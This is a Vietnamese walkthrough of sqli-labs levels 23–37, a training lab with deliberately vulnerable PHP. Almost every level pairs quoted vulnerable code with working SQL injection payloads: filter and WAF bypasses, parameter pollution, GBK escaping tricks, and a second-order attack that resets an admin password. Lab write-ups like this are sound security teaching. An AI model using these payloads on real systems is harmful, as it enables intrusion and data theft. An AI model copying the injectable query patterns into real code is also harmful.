# sqli-labs

Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)

- [Less-23](#Less-23)
- [Less-24](#Less-24)
- [Less-25](#Less-25)
- [Less-25a](#Less-25a)
- [Less-26](#Less-26)
- [Less-26a](#Less-26a)
- [Less-27](#Less-27)
- [Less-27a](#Less-27a)
- [Less-28](#Less-28)
- [Less-28a](#Less-28a)
- [Less-29](#Less-29)
- [Less-30](#Less-30)
- [Less-31](#Less-31)
- [Less-32](#Less-32)
- [Less-33](#Less-33)
- [Less-34](#Less-34)
- [Less-35](#Less-35)
- [Less-36](#Less-36)
- [Less-37](#Less-37)
- [Less-37](#Less-37)

## Less-23

Câu này source tương tự câu 1, chỉ có điều bị `filter` `comment` là `#` và `--`.

```php
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
```

Dưới đây là cách bypass

`?id=0'+union+select+1,2,@@datadir'`

Đơn giản chỉ là thêm `'` sau câu query. :joy:

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-23_1.png?raw=true)

Hoặc 1 cách khác để bypass là sử dụng `extractvalue()` thần thánh, sau đó chèn `or '1'='1` vào sau câu query để chắc chắn rằng câu query sẽ không bị lỗi cú pháp.

Payload: `?id=0'+and+extractvalue(0x0a,concat(0x0a,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3d'security')))+or+'1'='1`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-23_2.png?raw=true)

## Less-24

[Đây](https://github.com/Audi-1/sqli-labs/tree/master/Less-24) là source của bài này.

Source code bao gồm các `route` để `authenticate` user cơ bản như: `login`,`forgot password`,`logged-in`,`new_user`,`pass_change`...

Đọc source sơ qua thì mình tìm thấy điểm này khá thú vị ở file `pass_change.php`.

```php
$username= $_SESSION["username"];
$curr_pass= mysql_real_escape_string($_POST['current_password']);
$pass= mysql_real_escape_string($_POST['password']);
$re_pass= mysql_real_escape_string($_POST['re_password']);
	
if($pass==$re_pass)
{	
  	$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
		$row = mysql_affected_rows();
		echo '<font size="3" color="#FFFF00">';
		echo '<center>';
		if($row==1)
		{
			echo "Password successfully updated";
	
		}
		else
		{
			header('Location: failed.php');
			//echo 'You tried to be smart, Try harder!!!! :( ';
		}
}
else
	{
		echo '<font size="5" color="#FFFF00"><center>';
		echo "Make sure New Password and Retype Password fields have same value";
		header('refresh:2, url=index.php');
	}
```

Các input của user đều được filter bởi `mysql_real_escape_string()` ngoại trừ `username`, tận dụng điều này mình có thể thay đổi `password` của `admin` mà không cần biết `current password` của `admin`. Nhưng để làm được điều này, bạn cần phải có `SESSION` của `admin` hay nói cách khác là bạn phải đăng nhập vào tài khoản `admin` thì mới có thể thay đổi được `password`.

__Idea__

Create một account mới, mà khi mình thay đổi `password` của user này thì `password` của admin sẽ bị thay đổi. Ở đây mình tạo account mới với `username` là `admin'#`. Ở đây câu hỏi đặt ra là: Nếu thay đổi `password` của user `admin'#` thì làm sao trigger ở `admin` account được?

Nhưng khi mình thay đổi `password` ở `account` `admin'#` thì câu query lúc này sẽ là:

```mysql
UPDATE users SET PASSWORD='i_hacked_u' where username='admin'#' and password='$curr_pass'
```

Tức là đã bypass thành công.

Đây là danh sách `username` khi chưa create account `admin'#`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_1.png?raw=true)

Create user `admin'#` thành công.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_2.png?raw=true)

User `admin'#` đã được thêm vào `database`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_3.png?raw=true)

Sau đó mình login vào account `admin'#` và thay đổi `password` thành `i_hacked_u`.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_4.png?raw=true)

Boom

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_5.png?raw=true)

## Less-25

Câu query của bài này là:

```mysql
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

Nhưng `or`, `and` bị ban

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)

	return $id;
}
```

Tuy nhiên bypass cũng khá đơn giản và có nhiều cách.

- Lợi dụng `replace` `OR` hoặc `AND` thành `""`
  	Cụ thể là dùng `oorr` thay cho `or` và `aandnd` thay cho `and`.
  
  Payload: `?id=%27+UNION+(SELECT+1,2,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFOORRMATION_SCHEMA.SCHEMATA)--+`
  
- Sử dụng `Logical Operators`
  	Cụ thể là dùng `||` thay cho `OR` và `&&` thay cho `AND`.
  
  Payload: `?id=%27+||+extractvalue(0x0a,concat(0x0a,(select+@@datadir)))--+`

## Less-25a

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

Câu này tương tự câu 25.

Payload: `?id=0+union+select+1,2,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFOORRMATION_SCHEMA.SCHEMATA--+`

## Less-26

```mysql
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

Câu này danh sách ban khá nhiều: `OR`,`AND`,`/*`,`--`,`#`,` `,`\`.

Nhưng mình vẫn có thể bypass bằng cách ở câu 25.

Một số payload để bypass.

- Sử dụng `%0b` hoặc `%0a` thay cho `space`

  Payload: `?id=0%27%0bUNION%0bSELECT%0b1,2,(SELECT%0bGROUP_CONCAT(SCHEMA_NAME)%0bFROM%0bINFOORRMATION_SCHEMA.SCHEMATA)%27`

  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-26_1.png?raw=true)

- Sử dụng `||` để bypass
  Payload: `?id=%27+||+extractvalue(0x0a,concat(0x0a,(database())))||%27`
  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-26_2.png?raw=true)
  
- Sử dụng `%0b` và `%00` để bypass
  Payload: `?id=0%27%0bunion%0bselect%0b1,2,(SELECT%0bGROUP_CONCAT(SCHEMA_NAME)%0bFROM%0bINFOORRMATION_SCHEMA.SCHEMATA);%00` 

## Less-26a

```mysql
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

Vẫn như câu 26, mình vẫn sử dụng `%0b` để bypass `space` và sử dụng `%00` (null character).

Payload: `?id=0%27)%0bunion%0bselect%0b1,2,(SELECT%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFOORRMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-26a.png?raw=true)

## Less-27

```mysql
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
return $id;
}
```

Câu này ban khá nhiều: `/*`,`--`,`#`,` `,`union`,`select`,`UNION`,`SELECT`,`Union`,`Select`.

- Sử dụng `uNion` để bypass `UNION`, `sElect` để bypass `SELECT`.

  Payload: `?id=0%27%0buNion%0bsElect%0b1,2,(sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00` 

  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-27_1.png?raw=true)

- Sử dụng `extractvalue()`
  Payload: `?id=0%27%0band%0bextractvalue(0x0a,concat(0x0a,((sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security"))));%00`
  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-27_2.png?raw=true)

## Less-27a

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
$id= preg_replace('/[--]/',"", $id);		//Strip out --.
$id= preg_replace('/[#]/',"", $id);			//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
$id= preg_replace('/union/s',"", $id);	    //Strip out union
$id= preg_replace('/select/s',"", $id);	    //Strip out select
$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out Select
return $id;
}
```

Tương tự câu 27, ngoài `%0b` bạn cũng có thể sử dụng `%a0` để bypass `space`. 

Payload: `?id=?id=0"%0bunIon%0bsElect%0b1,2,(sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-27a.png?raw=true)

## Less-28

```mysql
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

```php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
$id= preg_replace('/[--]/',"", $id);				//Strip out --.
$id= preg_replace('/[#]/',"", $id);					//Strip out #.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
return $id;
}
```

Tương tự câu 27, ngoài `%0b` bạn cũng có thể sử dụng `%a0` để bypass `space`.

`?id=%27)%0bunIon%0bsElect%0b1,2,(sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00`

`?id=%27)%a0unIon%a0sElect%a01,2,(sElect%a0GROUP_CONCAT(TABLE_NAME)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA="security");%00`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-28.png?raw=true)

## Less-28a

```php
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

```php
function blacklist($id)
{
//$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
//$id= preg_replace('/[--]/',"", $id);				//Strip out --.
//$id= preg_replace('/[#]/',"", $id);					//Strip out #.
//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out spaces.
return $id;
}
```

Nhìn vào `blacklist` của câu này, thì `blacklist` của câu 28 bao hàm cả câu 28a này nên payload cũng sẽ tương tự.

`?id=%27)%a0unIon%a0sElect%a01,2,(sElect%a0GROUP_CONCAT(TABLE_NAME)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA=%22security%22);%00`

## Less-29

[Source](https://github.com/Audi-1/sqli-labs/blob/master/Less-29/login.php) của bài này.

Đọc sơ qua code thì bạn phải vượt qua `WAF` để có thể exploit `SQL Injection`.

Sau khi đọc [docs](https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf) của bài cung cấp thì mình tìm được một khái niệm khá thú vị, đó là `HTTP Parameter Pollution (HPP)`.

`HPP` là một kỹ thuật tấn công mà attacker sẽ tạo ra các `parameter` trùng lặp trong HTTP request. Lợi dụng các impact khi xử lý các `parameter` ở các ngôn ngữ khác nhau để inject code độc hại. Bypass WAF là một trong những kĩ thuật mà attacker có thể lợi dụng. Để hiểu thêm về HPP, có thể tham khảo: [đây](https://whitehat.vn/threads/gioi-thieu-ve-http-parameter-pollution.4932/) và [đây](https://stackoverflow.com/questions/19809142/http-parameter-pollution).

Trong `PHP`, khi bạn truyền 2 `param` trùng lặp thì nó sẽ nhận tham số cuối.

Hình dưới là kết quả về user với `id=1`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-29_1.png?raw=true)

Còn đây là khi truyền 2 param `id`, kết quả trả về user thứ 2.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-29_2.png?raw=true)

Đến đây thì chắc chắn để bypass WAF thì bạn phải inject code vào param thứ 2.

Payload: `login.php?id=1&id=0%27%20union%20select%201,2,%27nguyendqn%27--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-29_3.png?raw=true)

## Less-30

Tương tự câu 29.

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

```php
$id = '"' .$id. '"';
```

Và `$id` bị lồng vào `""` nên chỉ cần escape là có thể solve được.

Payload: `login.php?id=1&id=0"%20union%20select%201,2,%27nguyendqn%27--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-30.png?raw=true)

## Less-31

Tương tự câu 29 và 30.

```mysql
SELECT * FROM users WHERE id=($id) LIMIT 0,1
```

```php
$id = '"' .$id. '"';
```

Payload: `login.php?id=1&id=0")%20union%20select%201,2,%27This%20is%20level%2031%27--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-31.png?raw=true)

## Less-32

```php
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    
    return $string;
}
```

Ở câu này `'`  và `"` khi đi qua hàm `check_addslashes()` sẽ thành `\\'`, `\\"`. Dấu `\` sẽ thành `\\\\`.

Và ở đây chúng ta tìm thấy khái niệm về [GBK](https://en.wikipedia.org/wiki/GBK_(character_encoding)), ngoài ra nếu để ý các kí tự như `'` hay `"` khi đi qua `addslashes()` của PHP thì nó sẽ tự thêm `\` vào trước `'` hoặc `"`. Ta chỉ cần thêm `\` trước `'` là sẽ bypass được nhưng `\` đã bị replace thành `\\\\`.

Vậy giờ chúng ta sẽ phải tìm kí tự nào đó, mà khi nó đi qua `addslashes()` nó sẽ thêm `\`  ở trước.

Sau khi google thì mình tìm được [site](http://www.securityidiots.com/Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html) này. Cụ thể là các giá trị `0xbf5c`,`0xaf5c` là các `multibyte character` hợp lệ trong GBK(ngôn ngữ Trung Quốc).

Thử thêm `%bf` vào trước payload.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-32_1.png?raw=true)

Ở đây chúng ta thấy được, kí tự `%5c` tức là `\` được thêm vào. `0%bf'` => `0x30bf5c27`

Giờ mình chỉ việc chèn query vào thôi.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-32_2.png?raw=true)

## Less-33

```php
function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}
```

Mặc dù `check_addslashes()` có thay đổi nhưng về cơ bản không khác câu 32.

Nên payload sẽ cũng tương tự.

## Less-34

```php
$uname = addslashes($uname1);
$passwd= addslashes($passwd1);
```

 ```php
mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
 ```

Về cơ bản, câu này cũng không khác 2 câu trước, chỉ đổi `GET` method thành `POST` method.

Payload: `uname=0%bf%27+union+select+1,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--+&passwd=1&submit=Submit`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-34.png?raw=true)

## Less-35

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

Mặc dù input vẫn đi qua `check_addslashes()` nhưng câu query không cần `'` hay `"` để bypass :joy:

Payload: `?id=0+union+select+1,2,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--`

## Less-36

```php
function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}
```

Input đi qua `check_quotes()`, mình vẫn có thể sử dụng `%af`,`%bf`,`%cf`,`%df` để bypass.

Payload: `?id=0%bf%27+union+select+1,2,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--+`

## Less-37

```php
mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

```php
$uname1=$_POST['uname'];
$passwd1=$_POST['passwd'];
```

```php
$uname = mysql_real_escape_string($uname1);
$passwd= mysql_real_escape_string($passwd1);
```

Payload tương tự câu 34.

`uname=0%bf%27+union+select+1,GROUP_CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA--+&passwd=1&submit=Submit`

